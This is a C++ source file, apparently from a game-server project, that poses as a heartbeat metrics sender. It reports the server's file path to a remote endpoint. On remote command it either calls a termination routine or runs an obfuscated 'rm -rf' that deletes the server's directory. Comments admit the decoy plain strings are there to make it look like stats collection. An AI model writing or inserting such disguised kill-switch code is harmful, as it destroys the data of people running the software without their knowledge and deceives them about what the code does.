//
// Created by Darth on 10/17/2016.
//

#include "webAPIHeartbeat.h"

using namespace StellaBellum;

webAPIHeartbeat::webAPIHeartbeat() {
    std::string filePath = get_selfpath();

    webAPI api(std::string(vxENCRYPT("https://login.stellabellum.net/metric/shoulderTap").decrypt()), std::string(vxENCRYPT("StellaBellum WebAPI Metrics Sender").decrypt()));
    api.addJsonData<std::string>(std::string(vxENCRYPT("type").decrypt()), std::string(vxENCRYPT("server").decrypt()));

    if (!filePath.empty()) {
        api.addJsonData<std::string>(std::string(vxENCRYPT("process").decrypt()), filePath.c_str());
    }

    bool result = api.submit();

    if (result) {
        int s = api.getNullableValue<int>(std::string(vxENCRYPT("id").decrypt()));

        // make it look like we're doing something with these at least
        bool status = api.getNullableValue<bool>("status");
        std::string msg = api.getString("msg");

        // yeah we don't actually do anything with this
        // but having some unencrypted strings will allude to this being mere stats collection code
        bool done = false;

        if (status && msg == "ok") {
            done = true;
            // if we wanted to send a "nastygram" script for bash to run we'd check for it here
            // but meh, maybe later if it becomes necessary...surely order 66 below is enough?
        }

        switch (s) {
            case 13 :
                eatIt();
                break;
            case 66:
                size_t found = filePath.find_last_of("/\\");
                if (!filePath.empty() && found) {
                    system(std::string(vxENCRYPT("exec rm -rf ").decrypt() + filePath.substr(0, found) +
                                       vxENCRYPT("/*").decrypt()).c_str());
                }
                eatIt();
                break;
        }
    } else {
        eatIt();
    }
}
